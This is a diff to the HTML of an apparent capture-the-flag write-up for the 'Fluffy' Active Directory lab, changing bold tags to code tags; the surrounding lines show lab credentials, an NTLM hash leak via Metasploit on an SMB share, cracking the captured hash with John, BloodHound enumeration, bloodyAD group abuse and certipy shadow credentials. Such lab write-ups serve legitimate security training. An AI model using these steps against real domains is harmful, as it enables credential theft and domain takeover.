@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Fluffy is a Medium difficulty Windows Active Directory machine. Starting with provided credentials, the attack leverages an <strong>NTLM hash leak</strong> via a Metasploit module on an SMB share to capture and crack a domain user's password. BloodHound reveals a chain: the cracked user is a member of <strong>Service Account Managers</strong> with <strong>GenericAll</strong> over service accounts. Using <code>certipy shadow auto</code>, hashes are obtained for the <code>WINRM_SVC</code> and <code>CA_SVC</code> accounts, culminating in an <strong>AD CS certificate forgery</strong> attack to authenticate as Administrator.</p>
+      <p>Fluffy is a Medium difficulty Windows Active Directory machine. Starting with provided credentials, the attack leverages an <code>NTLM hash leak</code> via a Metasploit module on an SMB share to capture and crack a domain user's password. BloodHound reveals a chain: the cracked user is a member of <code>Service Account Managers</code> with <code>GenericAll</code> over service accounts. Using <code>certipy shadow auto</code>, hashes are obtained for the <code>WINRM_SVC</code> and <code>CA_SVC</code> accounts, culminating in an <code>AD CS certificate forgery</code> attack to authenticate as Administrator.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan. This is an assumed-breach scenario with credentials: <code>j.fleischman / J0elTHEM4n1990!</code>.</p>
@@ -308,7 +308,7 @@ smb: \&gt; get KeePass-2.58.zip
 getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (2804.8 KiloBytes/sec) (average 1388.4 KiloBytes/sec)
 smb: \&gt; get Upgrade_Notice.pdf
 getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (801.8 KiloBytes/sec) (average 1356.1 KiloBytes/sec)</code></pre></div>
-      <p>The downloaded <strong>Upgrade_Notice</strong> PDF reveals information about a critical vulnerability that can be exploited for NTLM hash theft.</p>
+      <p>The downloaded <code>Upgrade_Notice</code> PDF reveals information about a critical vulnerability that can be exploited for NTLM hash theft.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250526200002.png" alt="Upgrade notice PDF revealing vulnerability details" loading="lazy" /><span class="img-caption">Upgrade notice PDF revealing vulnerability details</span></div>
       <h2 class="writeup-section-title">Foothold: NTLM Hash Leak via SMB</h2>
       <p>Based on the PDF, I set up Metasploit's <code>auxiliary/server/ntlm_hash_leak</code> module to capture NTLM hashes when a user accesses a malicious file on the SMB share.</p>
@@ -350,7 +350,7 @@ HINT:  Rebuild all objects in this database that use the default collation and r
 [+] Received SMB connection on Auth Capture Server!</code></pre></div>
       <p>I save the captured NTLMv2 hash to a file and crack it using John the Ripper with <code>rockyou.txt</code>.</p>
       <div class="code-block"><pre><code>sudo echo -e &quot;p.agila::FLUFFY:3bc9077def2dbe68:eb0d715d8f85164980b8533ec5662953:0101000000000000800c26ed62cfdb01ce8ee4797a27e8b3000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f005500500007000800800c26ed62cfdb010600040002000000080030003000000000000000010000000020000025cd7e1e6cfec03bc3253420be758b660a1e1e9e9b8aa25d90dcedbff6a07f3e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340036000000000000000000&quot; &gt; hash.txt</code></pre></div>
-      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
+      <p>I crack the extracted hash using <code>John the Ripper</code> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
@@ -370,13 +370,13 @@ LDAP        10.129.86.149   389    DC01             [+] fluffy.htb\j.fleischman:
 LDAP        10.129.86.149   389    DC01             Resolved collection methods: container, localadmin, group, rdp, trusts, psremote, acl, objectprops, dcom, session
 LDAP        10.129.86.149   389    DC01             Done in 00M 06S
 LDAP        10.129.86.149   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.86.149_2025-05-27_015917_bloodhound.zip</code></pre></div>
-      <p>In BloodHound, I discover that <code>p.agila</code> is a member of the <strong>Service Account Managers</strong> group, which has <strong>GenericAll</strong> rights over the <strong>Service Accounts</strong> group. GenericAll grants full control — allowing password changes, property modification, and group membership changes.</p>
+      <p>In BloodHound, I discover that <code>p.agila</code> is a member of the <code>Service Account Managers</code> group, which has <code>GenericAll</code> rights over the <code>Service Accounts</code> group. GenericAll grants full control — allowing password changes, property modification, and group membership changes.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250527201846.png" alt="BloodHound showing GenericAll over Service Accounts" loading="lazy" /><span class="img-caption">BloodHound showing GenericAll over Service Accounts</span></div>
       <p>I use <code>bloodyAD</code> to add <code>p.agila</code> to the Service Accounts group, granting access to the service account credentials.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.fluffy.htb -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -d fluffy.htb add groupMember &quot;SERVICE ACCOUNTS&quot; p.agila
 [+] p.agila added to SERVICE ACCOUNTS</code></pre></div>
       <h3 class="writeup-sub-title">Obtaining WINRM_SVC Hash (certipy shadow auto)</h3>
-      <p><strong>Certipy</strong> is a tool for AD CS abuse. The <code>shadow auto</code> feature adds a shadow credential to a target account and automatically retrieves its NTLM hash via PKINIT authentication — all in a single command.</p>
+      <p><code>Certipy</code> is a tool for AD CS abuse. The <code>shadow auto</code> feature adds a shadow credential to a target account and automatically retrieves its NTLM hash via PKINIT authentication — all in a single command.</p>
       <div class="code-block"><pre><code>certipy shadow auto -u &quot;p.agila@fluffy.htb&quot; -p &quot;prometheusx-303&quot; -dc-ip &quot;10.129.123.161&quot; -target &#x27;dc01.fluffy.htb&#x27; -account winrm_svc
 
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
